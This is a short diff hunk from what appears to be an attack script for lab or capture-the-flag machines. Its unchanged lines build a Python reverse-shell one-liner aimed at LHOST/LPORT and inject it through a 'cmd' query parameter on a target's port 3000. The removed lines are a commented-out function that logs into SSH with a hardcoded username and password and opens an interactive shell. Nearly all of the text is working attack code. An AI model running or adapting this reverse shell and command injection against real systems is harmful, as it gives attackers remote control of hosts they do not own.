@@ -129,12 +129,6 @@ def spaceJam():
     payload = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(({LHOST},{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'"""
     sess.get(f"http://{ip}:3000/?cmd={payload}")
 
-# def food():
-#     global ip
-#     req = ssh(host=ip, user="ramen", password="noodlesRTheBest")
-#     shell = req.process("/bin/sh")
-#     shell.interactive()
-
 if __name__ == "__main__":
     
     machineName = sys.argv[1]
